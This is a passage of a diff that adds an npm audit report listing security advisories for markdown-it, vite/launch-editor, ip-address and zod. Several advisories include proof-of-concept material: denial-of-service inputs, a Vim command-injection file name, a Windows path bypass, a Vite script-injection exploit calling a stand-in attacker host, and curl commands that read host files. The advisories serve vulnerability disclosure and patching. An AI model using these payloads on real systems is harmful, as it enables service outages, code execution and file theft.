sizes.at(-1)\nconst controls = {\n  'HTML disabled': [mdDefault, 'x ' + '<!--'.repeat(n)],\n  'Closed comments': [mdHtml, 'x ' + '<!---->'.repeat(n)],\n  'HTML block': [mdHtml, '<!--'.repeat(n)],\n  'Plain text': [mdHtml, 'x ' + 'abcd'.repeat(n)]\n}\n\nfor (const [name, [md, src]] of Object.entries(controls)) {\n  console.log({ control: name, ms: measure(md, src) })\n}\n\nconst repoPayload = '</' + '<!--'.repeat(100000)\nconsole.log({\n  payload: 'Existing pathological test',\n  htmlFalseMs: measure(mdDefault, repoPayload),\n  htmlTrueMs: measure(mdHtml, repoPayload)\n})\n```\n\nMeasurements from the original report on `markdown-it@15.0.2`, Node.js 20:\n\n| Construct | 8,000 repetitions | 64,000 repetitions |\n| --- | ---: | ---: |\n| Comment | 170 ms | 8,799 ms |\n| Processing instruction | 26 ms | 1,566 ms |\n| Declaration | 93 ms | 5,628 ms |\n| CDATA | 119 ms | 4,179 ms |\n\nAn eightfold increase in repetitions produces approximately 35ÔÇô60 times the execution time, consistent with quadratic growth becoming dominant.\n\nFor the comment payload at 64,000 repetitions:\n\n- HTML disabled: 25 ms.\n- Closed comments: 29 ms.\n- Payload at the start of an HTML block: 1 ms.\n- Plain text: 1 ms.\n\nThe existing pathological-test payload with 100,000 comment openers took 33 ms with HTML disabled and 21,030 ms with HTML enabled. A separate comment payload with 128,000 repetitions, approximately 500 KiB, took 32,847 ms.\n\nExact timings depend on the runtime and hardware.\n\n### Impact\n\nThis is an availability issue affecting applications that render attacker-controlled Markdown with `html: true`, including applications using the `commonmark` preset.\n\nOn Node.js, a synchronous `render()` call can occupy a CPU core and block the event loop for seconds or tens of seconds, delaying other requests handled by the same process. Repeated submissions can cause denial of service. Browser applications can similarly become unresponsive when rendering on the main thread.\n\nSanitizing the generated HTML afterwards does not prevent the issue because the expensive processing occurs during Markdown rendering.\n\nThe default configuration, with HTML disabled, is unaffected by these payloads. Disabling HTML or limiting input size can reduce exposure while a fix is prepared.\n\nThe reported affected release is `15.0.2`; the full affected version range has not been established.",
+      "reported_by": null,
+      "title": "markdown-it: Quadratic-time denial of service in inline HTML parsing with html enabled",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-111766"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "markdown-it",
+      "vulnerable_versions": "<14.3.3",
+      "github_advisory_id": "GHSA-vfgh-jcmw-g37q",
+      "recommendation": "Upgrade to version 14.3.3 or later",
+      "patched_versions": ">=14.3.3",
+      "updated": "2026-10-20T20:08:20.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-407"
+      ],
+      "url": "https://github.com/advisories/GHSA-vfgh-jcmw-g37q"
+    },
+    "1242652": {
+      "findings": [
+        {
+          "version": "7.3.6",
+          "paths": [
+            "artifacts__dashboard-ui>vite"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/launch-editor/security/advisories/GHSA-r825-w8mm-5pxw\n- https://nvd.nist.gov/vuln/detail/CVE-2026-112944\n- https://github.com/vitejs/launch-editor/pull/156\n- https://github.com/vitejs/launch-editor/commit/f6e6701bb1f16f2dd242b321374f1b6cca6eb6d4\n- https://github.com/vitejs/launch-editor/releases/tag/v2.14.2\n- https://github.com/advisories/GHSA-r825-w8mm-5pxw",
+      "created": "2026-10-20T19:51:52.000Z",
+      "id": 1242652,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`launch-editor` forwarded file paths directly to editors without sanitization. If a path resembles a CLI flag, editors like Vim may interpret it as a command, potentially causing unintended file overwrites or command execution.\n\n### Impact\n\n#### Direct `launch-editor` users\n\nOnly apps that match all of the following conditions are affected:\n\n- The attacker is able to create a file system entry (e.g. a file or directory) starting with `+` or `-` in the working directory\n- The user uses or the app specifies any of the following editors:\n  - Vim (including gVim)\n  - MacVim\n  - Emacs (including Emacsclient)\n  - Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)\n- The first argument of `launchEditor` can start with `+` or `-` or the user is using WSL\n\n#### `launch-editor-middleware` users\n\nOnly apps that match the following conditions are affected:\n\n- The attacker is able to create a file system entry (e.g. a file or directory) starting with `+` or `-` in the working directory\n- The user uses or the app specifies any of the following editors:\n  - Vim (including gVim)\n  - MacVim\n  - Emacs (including Emacsclient)\n  - Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)\n- launch-editor older than v2.2.0 is used, or the user is using WSL\n\n#### Vite users\n\nOnly apps that match the following conditions are affected:\n\n- The attacker is able to create a file system entry (e.g. a file or directory) starting with `+` or `-` in the working directory\n- The user uses or the app specifies any of the following editors:\n  - Vim (including gVim)\n  - MacVim\n  - Emacs (including Emacsclient)\n  - Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)\n- The user is using WSL\n\n### Details\n\n`launchEditor(file)` function passes the file name as-is to the editor if the file with that file name exists. If the file name starts with `-` (also `+` for Vim), the editor treats them as flags rather than positional arguments. For example, Vim treats arguments starting with `+` as an Ex command. As a result, an existing relative directory such as:\n```\n+call writefile([\"SAFE_MARKER\"],\"LAUNCH_EDITOR_MARKER\")|qa!\n```\nis not treated as a filename when passed to Vim. Vim executes the embedded Ex command.\n\nThe following editor has a potentially destructive operation exposed to the CLI arguments:\n- Vim (including gVim)\n- MacVim\n- Emacs (including Emacsclient)\n- Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)\n\n`launch-editor-middleware` v2.2.0+ converts the passed file path to an absolute path so those are not affected as long as the user is not using WSL. For WSL, `launch-editor` converts the paths to relative paths internally, so those are still affected.\n\nVite 2.0.0+ uses `launch-editor-middleware` v2.2.0+ so the WSL users are only affected.",
+      "reported_by": null,
+      "title": "launch-editor: Editor CLI flag misinterpretation causing arbitrary command execution for some editors",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-112944"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "vite",
+      "vulnerable_versions": ">=7.0.0 <=7.3.6",
+      "github_advisory_id": "GHSA-r825-w8mm-5pxw",
+      "recommendation": "Upgrade to version 7.3.7 or later",
+      "patched_versions": ">=7.3.7",
+      "updated": "2026-10-20T19:51:54.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-88"
+      ],
+      "url": "https://github.com/advisories/GHSA-r825-w8mm-5pxw"
+    },
+    "1242659": {
+      "findings": [
+        {
+          "version": "7.3.6",
+          "paths": [
+            "artifacts__dashboard-ui>vite"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/launch-editor/security/advisories/GHSA-587h-7wmj-h5pm\n- https://nvd.nist.gov/vuln/detail/CVE-2026-112942\n- https://github.com/vitejs/launch-editor/commit/f13cd835d4b8e860b1d4d080ad8a490cc2463679\n- https://github.com/vitejs/launch-editor/releases/tag/v2.14.2\n- https://github.com/advisories/GHSA-587h-7wmj-h5pm",
+      "created": "2026-10-20T19:48:25.000Z",
+      "id": 1242659,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`launch-editor` checked `fs.existsSync(fileName)` before passing a supplied path to an editor command. On Windows, an attacker can bypass this check with a crafted path ending in `\\\\..:line:column`. This removes the requirement that the attacker be able to place a file with a malicious filename.\n\nCombined with the `%` escaping issue described in [GHSA-698v-4r3x-3vcv](https://github.com/vitejs/launch-editor/security/advisories/GHSA-698v-4r3x-3vcv), this bypass can lead to OS command injection when an attacker controls the file argument.\n\n### Impact\n\nOnly apps that runs on Windows is affected.\n\n### Details\n\nThe earlier advisory assumed that `fs.existsSync()` required an attacker-controlled filename to exist. This advisory covers a bypass of that requirement.\n\nA crafted value ending in `\\\\..:1:1` is interpreted differently by `launch-editor-middleware`, `launch-editor`, and Windows:\n\n1. `launch-editor-middleware` calls `path.resolve()` while the final path component is `..:1:1`, so it is not treated as a parent-directory component.\n2. `launch-editor` treats `:1:1` as a line-and-column suffix and removes it, leaving a path ending in `\\\\..`.\n3. On Windows, `fs.existsSync()` accepts the resulting path as the existing parent directory even though the attacker-controlled preceding component does not exist.\n4. Because the existence check passes, the crafted filename reaches the Windows shell command.",
+      "reported_by": null,
+      "title": "launch-editor: `fs.existsSync()` existence check can be bypassed on Windows",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-112942"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "vite",
+      "vulnerable_versions": ">=7.0.0 <=7.3.6",
+      "github_advisory_id": "GHSA-587h-7wmj-h5pm",
+      "recommendation": "Upgrade to version 7.3.7 or later",
+      "patched_versions": ">=7.3.7",
+      "updated": "2026-10-20T19:48:26.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-77"
+      ],
+      "url": "https://github.com/advisories/GHSA-587h-7wmj-h5pm"
+    },
+    "1242672": {
+      "findings": [
+        {
+          "version": "14.3.1",
+          "paths": [
+            "lib__api-spec>orval>typedoc>markdown-it"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/markdown-it/markdown-it/security/advisories/GHSA-gfr2-rv44-r23c\n- https://github.com/markdown-it/markdown-it/commit/48fbc465812c440020c663f040ab22deaf8f1eca\n- https://github.com/markdown-it/markdown-it/commit/d99f48839d37af6fd8a2617516c43dab90755503\n- https://github.com/markdown-it/markdown-it/releases/tag/14.3.3\n- https://github.com/markdown-it/markdown-it/releases/tag/15.0.3\n- https://github.com/advisories/GHSA-gfr2-rv44-r23c",
+      "created": "2026-10-20T20:28:44.000Z",
+      "id": 1242672,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nA link reference definition whose label or title is never closed is O(n┬▓) in markdown-it 15.0.2 with default options. Continuation lines are pulled lazily with str += lineContent in src/rules_block/reference.ts, and the subsequent charCodeAt and slice calls flatten the V8 cons-string, copying everything collected so far; this runs before the rule decides the definition is invalid. It is a regression introduced by PR #1004 in 14.0.0: 13.0.2 processed a 313 KB input in 125 ms, while every version since takes about 11 seconds on the same input. At the sizes below, 200 KB takes 3.6 seconds, 400 KB takes 18.1 seconds, and 800 KB takes 74.0 seconds, which is roughly 4ÔÇô5├ù per doubling. No options are required to trigger it.\n\n### Details\n\nsrc/rules_block/reference.ts appends continuation lines with str += lineContent at lines 74, 83, 100, 133, and 150, then keeps indexing the accumulated string via str.charCodeAt(pos) in the label and whitespace loops and str.slice(...) in parseLinkTitle. V8 represents += as a cons-string, and the next charCodeAt or slice flattens it, copying everything collected so far, so one definition spanning n lines costs O(n┬▓). Isolation confirms the rule is responsible: block-only parsing with inline disabled is still quadratic, md.disable('reference') makes the same input linear, and the same text without the leading [ is linear. The fix is to track positions in state.src instead of building str, or to collect line slices in an array and parse across them. At minimum, stop scanning the label after 999 characters (CommonMark ┬ğ6.3) before pulling more lines, and cap title continuation. Add a pathological test with a 100k-line unclosed title and label. Open PR #1215 edits the same file but its label check runs after the label loop, so it does not bound either variant and the fix can land together with that PR.\n\nThe observed output from PoC was:\nunclosed title n=100000   200009 B    3585.5 ms\nunclosed title n=200000   400009 B   18107.1 ms   (5.05x)\nunclosed title n=400000   800009 B   73954.4 ms   (4.08x)\n\nRegression comparison at 313 KB: 13.0.2 ÔåÆ 125 ms, 14.1.0 ÔåÆ 11.4 s, 15.0.0 ÔåÆ 10.6 s, 15.0.2 ÔåÆ 10.7 s.\n\n### Proof of concept\n\nHow to execute the PoC:\n1. mkdir -p markdown-it-poc && cd markdown-it-poc\n2. npm init -y\n3. npm i markdown-it@15.0.2\n4. node poc_markdown_it.js\n\nPoC below is:\n```javascript\n// poc_markdown_it.js\n// Requires: npm install markdown-it@15.0.2\nconst MarkdownIt = require('markdown-it');\nconst md = new MarkdownIt();\n\nfunction bench(label, src) {\n  const t0 = process.hrtime.bigint();\n  md.render(src);\n  const t1 = process.hrtime.bigint();\n  console.log(\n    `${label.padEnd(30)} ${String(src.length).padStart(9)} B ${(Number(t1 - t0) / 1e6).toFixed(1).padStart(9)} ms`\n  );\n}\n\n// Unclosed title: one reference definition spread over many lines\nfor (const n of [100000, 200000, 400000]) {\n  bench(`unclosed title n=${n}`, '[a]: /u \"' + 'x\\n'.repeat(n));\n}\n\n// Unclosed label\nfor (const n of [5000, 10000, 20000]) {\n  bench(`unclosed label n=${n}`, '[' + 'a\\n'.repeat(n));\n}\n```\n\n### Impact\n\nThis is an algorithmic-complexity denial of service (CWE-407). Any server that renders user Markdown with markdown-it is affected with default options, including comments, issues, chat, wikis, docs previews, and LLM chat UIs. A ~400 KB request body blocks the Node.js event loop for about 18 seconds and an ~800 KB body for about 74 seconds. This is the same class and attacker model as GHSA-253c, but it is reachable without any opt-in option, since the affected path is a core block rule.",
+      "reported_by": null,
+      "title": "markdown-it: Quadratic-time rendering of a single multi-line link reference definition with default options (regression since 14.0)",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-111758"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "markdown-it",
+      "vulnerable_versions": ">=14.1.0 <14.3.3",
+      "github_advisory_id": "GHSA-gfr2-rv44-r23c",
+      "recommendation": "Upgrade to version 14.3.3 or later",
+      "patched_versions": ">=14.3.3",
+      "updated": "2026-10-20T20:28:46.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-407"
+      ],
+      "url": "https://github.com/advisories/GHSA-gfr2-rv44-r23c"
+    },
+    "1242725": {
+      "findings": [
+        {
+          "version": "7.3.6",
+          "paths": [
+            "artifacts__dashboard-ui>vite"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-9jrq-w75r-8gcw\n- https://nvd.nist.gov/vuln/detail/CVE-2026-112945\n- https://github.com/vitejs/vite/pull/23653\n- https://github.com/vitejs/vite/commit/7dafd8e56f152403a3230608fa4005273c2e9e17\n- https://github.com/advisories/GHSA-9jrq-w75r-8gcw",
+      "created": "2026-10-21T16:48:14.000Z",
+      "id": 1242725,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nWhen accessing a malicious site while a dev server using Vite is running, that site was able to load scripts in a page served by the dev server.\n\n### Impact\n\nOnly apps that match the following conditions are affected:\n\n- the dev server passes an unchanged browser request URL to `server.transformIndexHtml`: this is normally used for `server.middlewareMode: true` or `appType: 'custom'`. The internal call for `appType: 'spa'` and `appType: 'mpa'` does not match this.\n- the transformed HTML contains an inline module script\n- from the script in the page served by the dev server, the app stores sensitive values in the location accessible or allows critical actions\n\n### Details\n\n[Vite's SSR guide for 8.2.1](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/docs/guide/ssr.md#L119-L131) documents the affected setup. The application embeds Vite in middleware mode, reads trusted HTML, and passes the browser's unchanged request URL to the transform:\n\n```js\nconst url = req.originalUrl\ntemplate = await vite.transformIndexHtml(url, template)\n```\n\nFor a development server at `http://localhost:5173`, an attacker can send this URL:\n\n```text\nhttp://localhost:5173//evil.example/payload.js?/../../package.json\n```\n\nIn Vite 8.2.1, [`createDevHtmlTransformFn` and `getHtmlFilename` in `indexHtml.ts`](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L99-L115) use the request URL as both the transform `path` and the input to `path.join`. The value passed to `path.join` still includes its query text.\n\nChromium preserves `/../../package.json` because it follows `?` and is therefore query text. Vite treats the same characters as filesystem path components, so the `..` components resolve the derived filename to the existing project `package.json`.\n\n[The existing file branch in `indexHtml.ts`](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L216-L232) checks that filename with `fs.existsSync`, then preserves the `htmlPath` supplied by the attacker as `proxyModuleUrl`. [The inline module rewrite in the same file](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L271-L278) writes that value into the generated `src`:\n\n```html\n<script type=\"module\" src=\"//evil.example/payload.js?/../../package.json?html-proxy&index=0.js\"></script>\n```\n\nThe generated value is a valid URL. Its leading `//` tells the browser to request the module from `evil.example` using the Vite page's scheme. The attacker returns JavaScript for that request, and Chromium executes it in the Vite page.\n\n### PoC\n\n```js\nimport { createServer as createHttpServer } from 'node:http'\nimport { createRequire } from 'node:module'\nimport { dirname, join } from 'node:path'\nimport { fileURLToPath, pathToFileURL } from 'node:url'\n\nconst directory = dirname(fileURLToPath(import.meta.url))\nconst require = createRequire(join(directory, 'package.json'))\nconst { chromium } = require('playwright-chromium')\nconst viteModule = await import(\n  pathToFileURL(require.resolve('vite')).href\n)\nconst createViteServer =\n  viteModule.createServer ?? viteModule.default.createServer\n\n// This loopback server stands in for a separately hosted attacker website.\nconst attackerPort = 4173\nconst exploitPath = `//127.0.0.1:${attackerPort}/payload.js?/../../package.json`\nconst html = '<script type=\"module\">document.body.textContent = \"Vite app\"</script>'\n\nconst listen = (server, port = 0) =>\n  new Promise((resolve, reject) => {\n    server.once('error', reject)\n    server.listen(port, '127.0.0.1', () => {\n      server.off('error', reject)\n      resolve(server.address().port)\n    })\n  })\n\nconst close = (server) =>\n  new Promise((resolve, reject) => {\n    server.close((error) => (error ? reject(error) : resolve()))\n  })\n\nlet attackerRequest = null\nconst attacker = createHttpServer((request, response) => {\n  attackerRequest = request.url\n  response.writeHead(200, {\n    'access-control-allow-origin': '*',\n    'content-type': 'text/javascript',\n  })\n  response.end(\n    \"document.documentElement.dataset.viteXssPoc = 'executed'\",\n  )\n})\n\nconst vite = await createViteServer({\n  appType: 'custom',\n  configFile: false,\n  root: directory,\n  server: {\n    hmr: false,\n    middlewareMode: true,\n    watch: null,\n  },\n})\n\nconst application = createHttpServer((request, response) => {\n  vite.middlewares(request, response, async (error) => {\n    if (error) {\n      response.destroy(error)\n      return\n    }\n\n    try {\n      const transformed = await vite.transformIndexHtml(request.url, html)\n      response.writeHead(200, { 'content-type': 'text/html' })\n      response.end(transformed)\n    } catch (transformError) {\n      response.destroy(transformError)\n    }\n  })\n})\n\nawait listen(attacker, attackerPort)\nconst applicationPort = await listen(application)\nconst browser = await chromium.launch({ headless: true })\n\ntry {\n  const page = await browser.newPage()\n  await page.goto(`http://127.0.0.1:${applicationPort}${exploitPath}`)\n  await page.waitForFunction(\n    () => document.documentElement.dataset.viteXssPoc === 'executed',\n  )\n\n  console.log(`attacker request: ${attackerRequest}`)\n  console.log('JavaScript from the attacker server executed in the Vite page')\n} finally {\n  await browser.close()\n  await close(application)\n  await vite.close()\n  await close(attacker)\n}\n```\n\nObserved output on Vite 8.2.1:\n```text\nattacker request: /payload.js?/../../package.json?html-proxy&index=0.js\nJavaScript from the attacker server executed in the Vite page\n```",
+      "reported_by": null,
+      "title": "Vite: Cross origin script execution through Vite custom middleware",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-112945"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "vite",
+      "vulnerable_versions": ">=7.0.0 <=7.3.6",
+      "github_advisory_id": "GHSA-9jrq-w75r-8gcw",
+      "recommendation": "Upgrade to version 7.3.7 or later",
+      "patched_versions": ">=7.3.7",
+      "updated": "2026-10-21T16:48:15.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-80"
+      ],
+      "url": "https://github.com/advisories/GHSA-9jrq-w75r-8gcw"
+    },
+    "1242731": {
+      "findings": [
+        {
+          "version": "7.3.6",
+          "paths": [
+            "artifacts__dashboard-ui>vite"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-rq7h-c2jc-7f22\n- https://nvd.nist.gov/vuln/detail/CVE-2026-112946\n- https://github.com/vitejs/vite/pull/23656\n- https://github.com/vitejs/vite/commit/170b92791421bcd484f7325936d989a82d6bd4aa\n- https://github.com/vitejs/vite/commit/45c0e3392a298626955a0ab93a8e51232daac721\n- https://github.com/vitejs/vite/commit/c3e06f92e969952466b4e2f5801e85e1e00cd905\n- https://github.com/vitejs/vite/commit/e570d8d016096b5f8f6f09808376ca6cf73f27d0\n- https://github.com/vitejs/vite/commit/f0d76c7da13d5e794807b82f0b86c1931a8438e3\n- https://github.com/advisories/GHSA-rq7h-c2jc-7f22",
+      "created": "2026-10-21T16:47:42.000Z",
+      "id": 1242731,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe content of files outside `server.fs` setting can be returned to the browser if the project imports a file path concatenated with the `root`. For example, if the project references `<path-to-project-root>/etc/hosts`, the content of `/etc/hosts` was possible to be returned.\n\nThe content of files outside the `server.fs.allow` option can be returned to the browser when a project imports a file whose root-relative path matches an absolute path on the host. For example, referencing `<project-root>/etc/hosts` could make Vite return the host's `/etc/hosts` file.\n\n### Impact\n\nOnly apps that meet all of the following conditions are affected:\n\n- explicitly expose the Vite dev server to the network (using `--host` or the [`server.host` option](https://vite.dev/config/server-options#server-host))\n- contain an imported file whose root-relative browser URL is also the absolute path of a readable file on the host\n- The sensitive file is not matched by [`server.fs.deny`](https://vite.dev/config/server-options#server-fs-deny)\n- the dev server is not running on Windows\n\n### Details\n\nWhen Vite analyzes an in-root import, it rewrites the resolved module ID to a browser URL such as `/etc/hostname`. In affected versions, Vite converts that URL with `fsPathFromUrl` and adds the result to `safeModulePaths`. Because `fsPathFromUrl` ensures a leading slash without resolving the URL against the project root, the project URL `/etc/hostname` is recorded as if it were the absolute filesystem path `/etc/hostname`.\n\nFor a later request to `/@fs/etc/hostname`, the raw-filesystem middleware interprets `/etc/hostname` as an absolute path. The access check applies `server.fs.deny`, then accepts paths present in `safeModulePaths` before checking `server.fs.allow`. As a result, the request can return the host file instead of the project file that originally populated `safeModulePaths`.\n\n### PoC\nThe following example requires Linux with a readable `/etc/hostname`:\n```bash\n$ mkdir vite-safe-module-path-poc\n$ cd vite-safe-module-path-poc\n$ npm init -y\n$ npm install vite@8.3.1\n$ mkdir -p etc\n$ echo 'PROJECT-DECOY\\n' > etc/hostname\n$ echo 'import \"./etc/hostname\"\\n' > main.js\n$ npx vite --host 127.0.0.1\n```\n\nIn another terminal:\n```bash\n$ curl -o /dev/null -s -w '%{http_code}\\n' http://127.0.0.1:5173/main.js\n200\n$ curl -sS -o response -w '%{http_code}\\n' http://127.0.0.1:5173/@fs/etc/hostname\n200\n$ cmp -s response /etc/hostname && echo 'response matches host file'\nresponse matches host file\n```",
+      "reported_by": null,
+      "title": "Vite: Files outside `server.fs.allow` could be served when project paths match system paths on non-Windows machine",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-112946"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "vite",
+      "vulnerable_versions": ">=7.0.0 <=7.3.6",
+      "github_advisory_id": "GHSA-rq7h-c2jc-7f22",
+      "recommendation": "Upgrade to version 7.3.7 or later",
+      "patched_versions": ">=7.3.7",
+      "updated": "2026-10-21T16:47:43.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-22",
+        "CWE-284"
+      ],
+      "url": "https://github.com/advisories/GHSA-rq7h-c2jc-7f22"
+    },
+    "1242883": {
+      "findings": [
+        {
+          "version": "10.7.0",
+          "paths": [
+            "artifacts__api-server>express-rate-limit>ip-address"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/beaugunderson/ip-address/security/advisories/GHSA-rxp7-6hxx-x8q5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-111997\n- https://github.com/beaugunderson/ip-address/commit/ec80fcd5d7b97defecfd39717d782a9f9f8b89dd\n- https://github.com/beaugunderson/ip-address/releases/tag/v10.7.4\n- https://github.com/advisories/GHSA-rxp7-6hxx-x8q5",
+      "created": "2026-10-22T16:19:39.000Z",
+      "id": 1242883,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`new Address6()` and `Address6.isValid()` strip a zone identifier with the pattern `/%.*$/` before they apply the 45-character length limit. When the string holds many `%` characters followed by a line terminator, the pattern is retried from every `%` and each attempt scans to the line terminator before failing, so rejecting the string takes time proportional to the square of its length. 10,000 `%` characters and a newline take 41 ms, 40,000 take 632 ms and 100,000 take 3.9 s of synchronous work. The same strings without the newline are rejected in under a millisecond.\n\nAn application that validates an attacker-supplied string with these methods can be stalled by a single long request. The input is rejected with the correct `AddressError`; the cost of reaching that rejection is the defect.\n\n### Details\n\nThe constructor in `src/ipv6.ts` removes the CIDR suffix, then the zone, then checks the length of what is left:\n\n```ts\nconst zone = constants6.RE_ZONE_STRING.exec(address);\n\nif (zone) {\n  this.zone = zone[0];\n\n  address = address.replace(constants6.RE_ZONE_STRING, '');\n}\n\nconst longest = this.groups * 5 + 5;\n\nif (address.length > longest) {\n  throw new AddressError(`IPv6 addresses are at most ${longest} characters.`);\n}\n```\n\n`RE_ZONE_STRING` is `/%.*$/`. It has no anchor at its start, `.` does not match a line terminator (`\\n`, `\\r`, U+2028 or U+2029), and without the `m` flag `$` matches only at the end of the input. For `%` repeated N times and then `\\n`, the engine starts a match at the first `%`, `.*` consumes the remaining `%` characters up to the newline, `$` fails there, and backtracking through every shorter `.*` fails too. The engine then starts again at the second `%`, and so on: N starts, each proportional to N. The length limit that follows rejects the string in constant time, after the scan has already run.\n\nThe line terminator need not be last. Any string in which many `%` characters precede a line terminator behaves the same way.\n\nEvery entry point that passes a caller's string to the `Address6` constructor is affected: `new Address6()`, `isValid()`, both arguments of `fromAddressAndMask()` and `fromAddressAndWildcardMask()`, and the prefix argument of `fromAddress4Nat64()` and `toAddress4Nat64()`. `fromWildcard()` rejects a `%` before it constructs anything, `fromURL()` admits only hex digits, colons and dots in a host, and `fromArpa()` checks the nibble grammar first, so those three are unaffected. `Address4` has no zone and is unaffected.\n\n### Affected versions\n\n`<= 10.7.3`. The zone pattern has been in the constructor since 1.0.0; 5.9.4, 9.0.5 and 10.7.0 show the same timings as 10.7.3.\n\n### Impact\n\n`Address6.isValid()` on N `%` characters and a newline, measured on ip-address 10.7.3 and node 24.21.0:\n\n| Input | Wall time | Same length of `!` |\n|---|---|---|\n| 5,461 characters | 13 ms | 0.1 ms |\n| 16 KiB | 108 ms | 0.1 ms |\n| 100 KB | 3.9 s | 0.1 ms |\n| 256 KiB | 27 s | 0.2 ms |\n\nThe parse is synchronous, so the event loop is blocked for the whole of the wall time and nothing else on that process is served. No memory is retained and the process resumes when the call returns.\n\n### Reachability\n\nThe input needs a line terminator after the `%` characters, which decides where it can arrive. An HTTP header value cannot carry a carriage return or a line feed, so a host or address taken from a header does not reach this. A URL can carry both characters percent-encoded at three bytes each, and Node's default 16 KB limit on the request line and headers admits about 5,461 of them: 13 ms. A request body is where the larger sizes come from. Common body parsers default to between 100 KB and 1 MB, and at 100 KB one field passed to the parser unchecked blocks the process for 3.9 s.\n\n### Proof of concept\n\n`npm i ip-address@10.7.3`, then:\n\n```js\nconst { Address6 } = require('ip-address');\n\nfunction time(input) {\n  const start = process.hrtime.bigint();\n\n  Address6.isValid(input);\n\n  return `${(Number(process.hrtime.bigint() - start) / 1e6).toFixed(1)} ms`;\n}\n\nfor (const n of [10000, 20000, 40000, 100000]) {\n  console.log(`${n}: ${time(`${'%'.repeat(n)}\\n`)}, without the newline ${time('%'.repeat(n))}`);\n}\n```\n\nOn affected versions (node 24.21.0):\n\n```\n10000: 41.0 ms, without the newline 0.0 ms\n20000: 161.1 ms, without the newline 0.0 ms\n40000: 632.4 ms, without the newline 0.1 ms\n100000: 3899.8 ms, without the newline 0.1 ms\n```\n\nEach doubling of the input multiplies the time by four.\n\n### Remediation\n\nUpgrade to the patched release. In the fix, the constructor finds the zone by the index of the first `%` and accepts the remainder as a zone only when it holds no line terminator, which reads the input once. 1 MiB of the input above is rejected in about a millisecond. Every address that parsed before parses to the same result, and a string with a line terminator after a `%` is rejected as it was.\n\n`RE_ZONE_STRING` stays exported from `v6/constants` for code that imports it directly and is marked `@deprecated`; the library itself does not call it.\n\nIf you cannot upgrade immediately, reject a candidate longer than an address with a zone identifier can be before you parse it:\n\n```js\nif (host.length > 64) throw new Error('not an IP address');\n```",
+      "reported_by": null,
+      "title": "ip-address: Address6 matches a zone identifier in quadratic time ahead of its length limit, allowing a single long string to stall the process",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-111997"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "ip-address",
+      "vulnerable_versions": "<=10.7.3",
+      "github_advisory_id": "GHSA-rxp7-6hxx-x8q5",
+      "recommendation": "Upgrade to version 10.7.4 or later",
+      "patched_versions": ">=10.7.4",
+      "updated": "2026-10-22T16:19:41.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-rxp7-6hxx-x8q5"
+    },
+    "1243066": {
+      "findings": [
+        {
+          "version": "3.25.76",
+          "paths": [
+            "artifacts__dashboard-ui>zod"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2023-54404\n- https://github.com/colinhacks/zod/issues/1872\n- https://github.com/colinhacks/zod/pull/6475\n- https://www.vulncheck.com/advisories/zod-uncontrolled-resource-consumption-via-array-validation\n- https://github.com/colinhacks/zod/pull/6652\n- https://github.com/colinhacks/zod/commit/a0ebf970f2d752e5f58527cd2942ff48be4f46bd\n- https://github.com/advisories/GHSA-mrhx-c7xc-m3w5",
